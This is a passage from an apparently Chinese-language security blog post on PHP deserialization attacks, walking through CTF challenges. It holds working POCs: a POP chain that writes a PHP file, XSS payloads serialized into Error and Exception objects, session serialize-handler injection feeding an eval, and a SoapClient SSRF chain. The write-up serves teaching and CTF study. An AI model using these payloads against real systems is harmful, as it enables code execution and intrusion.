class="string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger = <span class="keyword">new</span> Logger(<span class="keyword">new</span> LogWriter_File(<span class="string">&quot;song_views&quot;</span>, <span class="keyword">new</span> LogFileFormat(<span class="keyword">array</span>(<span class="variable">$fltr</span>), <span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;url . <span class="string">&quot;&#x27;&gt;&lt;i&gt;&quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="keyword">$this</span>-&gt;group;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">&quot;Song &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; by [i]&quot;</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">&quot;[/i] viewed.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LogWriter_File::writeLog($txt) 的写入文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$format</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;__&quot;</span>, str_replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = <span class="variable">$format</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="keyword">$this</span>-&gt;format-&gt;format(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="string">&quot;C:\\WWW\\test\\ctf\\kon\\&quot;</span> . <span class="keyword">$this</span>-&gt;filename, <span class="variable">$txt</span>, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>LogFileFormat::format </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filters</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$endl</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filters</span>, <span class="variable">$endl</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = <span class="variable">$filters</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = <span class="variable">$endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">      <span class="variable">$txt</span> = <span class="variable">$filter</span>-&gt;filter(<span class="variable">$txt</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$txt</span> = str_replace(<span class="string">&#x27;\n&#x27;</span>, <span class="keyword">$this</span>-&gt;endl, <span class="variable">$txt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>OutputFilter::filter 自定义 preg_replace 内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$matchPattern</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$replacement</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pattern</span>, <span class="variable">$repl</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = <span class="variable">$repl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, <span class="variable">$data</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>preg_replace</code> 和 <code>str_replace</code> 的区别</p>
<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200131027.png"></p>
<p>final POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$matchPattern</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$replacement</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = <span class="string">&quot;//&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filters</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$endl</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = <span class="keyword">array</span>(<span class="keyword">new</span> OutputFilter()); <span class="comment"># foreach ($this-&gt;filters as $filter)</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;info.php&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = <span class="keyword">new</span> LogFileFormat();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logwriter</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = <span class="keyword">new</span> LogWriter_File();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$lyrics</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$song</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = <span class="keyword">new</span> Logger();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Lyrics();</span><br><span class="line">print_r(urlencode(serialize(<span class="variable">$payload</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113200248029.png"></p>
<h2 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h2><h3 id="ZipArchive-open"><a href="#ZipArchive-open" class="headerlink" title="ZipArchive::open"></a>ZipArchive::open</h3><p>@Threezh1 文中已经写的很详细了。这里不再补充<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6454#toc-10">https://xz.aliyun.com/t/6454#toc-10</a></p>
<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p>关于SOAP安全问题：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/153065#h2-1">https://www.anquanke.com/post/id/153065#h2-1</a></p>
<p>利用条件：<br>需要有soap扩展，且不是默认开启，需要手动开启<br>需要调用一个不存在的方法触发其<code>__call()</code>函数</p>
<p>仅限于http/https协议，且http头部还存在crlf漏洞(SOAP + CRLF = SSRF)</p>
<p>例子可见下文: LCTF2018-bestphp’s revenge </p>
<h3 id="Error-XSS"><a href="#Error-XSS" class="headerlink" title="Error XSS"></a>Error XSS</h3><p>@l3m0n 师傅blog中提到了XSS</p>
<p>Error<br>适用于php7版本</p>
<p>XSS<br>开启报错的情况下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$t</span> = urldecode(<span class="string">&#x27;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Exception-XSS"><a href="#Exception-XSS" class="headerlink" title="Exception XSS"></a>Exception XSS</h3><p>@l3m0n 师傅blog中提到了XSS</p>
<p>Exception<br>适用于php5、7版本</p>
<p>XSS<br>开启报错的情况下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Test</span></span><br><span class="line"><span class="variable">$c</span> = urldecode(<span class="string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<h3 id="多种姿势组合拳"><a href="#多种姿势组合拳" class="headerlink" title="多种姿势组合拳"></a>多种姿势组合拳</h3><p>例子可见:Pornhub某漏洞 ： <a target="_blank" rel="noopener" href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1</a></p>
<p>涉及姿势如下<br>可获取目录： DirectoryIterator<br>XXE： SimpleXMLElement<br>创建空白文件： SQLite3</p>
<h2 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h2><p>原理: 对类中不存在的属性也会进行反序列化。且PHP 在反序列化时，底层代码是以 <code>;</code>作为字段的分隔，以 <code>&#125;</code>作为结尾(字符串除外)，并且是根据长度判断内容的</p>
<p>利用: 构造字符串</p>
<h3 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h3><p>0ctf2016 一道web题</p>
<h3 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a>例子二</h3><p>安洵杯 - easy_serialize_php<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6911#toc-3">https://xz.aliyun.com/t/6911#toc-3</a></p>
<h2 id="Session-反序列化"><a href="#Session-反序列化" class="headerlink" title="Session 反序列化"></a>Session 反序列化</h2><h3 id="参数相关"><a href="#参数相关" class="headerlink" title="参数相关"></a>参数相关</h3><p>session相关参数配置</p>
<table>
<thead>
<tr>
<th align="center">Directive</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">session.save_handler</td>
<td align="center">session保存形式。默认为files</td>
</tr>
<tr>
<td align="center">session.save_path</td>
<td align="center">设置session的存储路径,默认在/tmp</td>
</tr>
<tr>
<td align="center">session.serialize_handler</td>
<td align="center">session序列化存储所用处理器。默认为php。</td>
</tr>
<tr>
<td align="center">session.upload_progress.cleanup</td>
<td align="center">一旦读取了所有POST数据，立即清除进度信息。默认开启</td>
</tr>
<tr>
<td align="center">session.upload_progress.enabled</td>
<td align="center">将上传文件的进度信息存在session中。默认开启。</td>
</tr>
</tbody></table>
<p>PHP处理器三种序列化方式</p>
<table>
<thead>
<tr>
<th align="center">处理器</th>
<th align="center">对应的存储格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php_binary</td>
<td align="center">键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php</td>
<td align="center">键名＋竖线＋经过serialize()函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_serialize</td>
<td align="center">serialize()函数反序列处理数组方式</td>
</tr>
</tbody></table>
<h3 id="差异性"><a href="#差异性" class="headerlink" title="差异性"></a>差异性</h3><p>PHP处理器差异性如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>URL传参，<code>?name=P2hm1n</code>。session以文本存储方式保存在 <code>/tmp</code> 目录下。</p>
<p>php: <code>name|s:6:&quot;P2hm1n&quot;;</code><br>php_binary: <code>二进制字符names:6:&quot;P2hm1n&quot;;</code><br>php_serialize: <code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;&#125;</code></p>
<p>漏洞核心也体现在 <strong>差异性</strong> 三个字</p>
<p>Q: 什么是差异性:<br>A: 选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。</p>
<h3 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h3><h4 id="trick-1"><a href="#trick-1" class="headerlink" title="trick-1"></a>trick-1</h4><p>利用前提: 脚本中设置的序列化处理器与php.ini设置的不同</p>
<p>常见漏洞场景: <code>php_serilize</code> 方式存入，解析又是用的 <code>php</code> 处理器</p>
<p>利用原理： php 在获取 session 的时候，会按照<code>session.serialize_handler=php</code> 规则来处理 session 文件。把 <code>|</code> 前面的值作为一个session键名，对 <code>|</code> 后面就会进行一个反序列化操作</p>
<h4 id="trick-2"><a href="#trick-2" class="headerlink" title="trick-2"></a>trick-2</h4><p>配置不当可造成session被控。</p>
<p>当<code>session.upload_progress.enabled</code>打开时，php会记录上传文件的进度，在上传时会将其信息保存在<code>$_SESSION</code>中。</p>
<p>但当一个文件上传时，同时POST一个与php.ini中<code>session.upload_progress.name</code>同名的变量时(<code>session.upload_progress.name</code>的变量值默认为<code>PHP_SESSION_UPLOAD_PROGRESS</code>），PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们由此来设置session。</p>
<p><code>session.upload_progress.cleanup</code>关闭。这就 极大提高了漏洞的利用成功率。如果此选项<code>session.upload_progress.cleanup</code>打开，那么在利用时攻击者需要上传large and crash文件，来使得我们传入的data得以执行。</p>
<p>详情见<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=71101">https://bugs.php.net/bug.php?id=71101</a></p>
<h3 id="例子一-1"><a href="#例子一-1" class="headerlink" title="例子一"></a>例子一</h3><p>题目链接: <a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>差异点:</p>
<ol>
<li>phpinfo中 <code>session.serialize_handler = php_serialize</code>。</li>
<li>题目中 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></li>
</ol>
<p>核心目的: 进入 <code>eval</code> 函数执行命令。由于题目中并没有反序列化操作，其中 <code>$this-&gt;mdzz</code> 不可通过常规手段控制。</p>
<p>观察phpinfo中session其他有关信息<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201620913.png"></p>
<p>构造一个上传的页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;change&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>构造poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new OowoO();</span><br><span class="line">$a-&gt;mdzz = &quot;payload&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>扫描目录<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201629436.png"></p>
<p>phpinfo中的<code>_SERVER[&quot;SCRIPT_FILENAME&quot;]</code>字段得到路径：<code>/opt/lampp/htdocs/</code>。</p>
<p>随后用绝对路径读取文件<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201637025.png"></p>
<h3 id="例子二-1"><a href="#例子二-1" class="headerlink" title="例子二"></a>例子二</h3><p>题目来源: LCTF2018-bestphp’s revenge </p>
<p>题目给了两个源码</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[f],<span class="variable">$_POST</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[name]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[name] = <span class="variable">$_GET</span>[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>),<span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>flag.php 跟 index.php 之间的微妙联系体现在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>。这里自然想到SSRF。可以利用上文提到的php原生类SoapClient中的<code>__call</code>方法进行SSRF。</p>
<p>构造SSRF的POC (POC来自 @Smi1e)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="variable">$url</span>, <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$url</span>));</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . urlencode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php 中涉及到了<code>call_user_func</code> 函数。PHP手册中 给了几个<code>call_user_func</code> 函数的例子: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php</a><br>其中需要注意的是当我们的第一个参数为数组时，会把第一个值当作类名，第二个值当作方法进行回调<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201649416.png" alt="image-20201113201649416"></p>
<p>为了进行反序列化只能利用PHP中SESSION反序列化机制。主要体现在差异性(当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞)。但是在PHP中默认使用的是PHP引擎。所以这里为了展现session的差异性，我们需要通过代码手动构造差异性。</p>
<p>通过 <code>call_user_func($_GET[&#39;f&#39;], $_POST);</code> 构造PHP引擎差异性。并通过 <code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code> 将构造的Soap类序列化字符串写入session文件<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201704046.png" alt="image-20201113201704046"></p>
<p>为了调用 <code>__call</code> 方法。首先利用<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>传入 <code>f=extract</code> 进行POST变量覆盖。随后通过GET传参令<code>$_SESSION[&#39;name&#39;] = SoapClient</code>。再利用POST传参进行变量b的覆盖。即调用 SoapClient 类不存在的 <code>welcome_to_the_lctf2018</code> 方法，从而触发 <code>__call</code> 方法发起 soap 请求进行 SSRF 。<br><img src="/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20201113201738749.png"></p>
<p>最后携带cookie访问</p>
<h2 id="Phar拓展攻击面"><a href="#Phar拓展攻击面" class="headerlink" title="Phar拓展攻击面"></a>Phar拓展攻击面</h2><h3 id="Phar简介"><a href="#Phar简介" class="headerlink" title="Phar简介"></a>Phar简介</h3><p>拓展攻击面体现在: 可通过构造 phar 在没有 <code>unserailize()</code> 的情况下实现反序列化攻击</p>
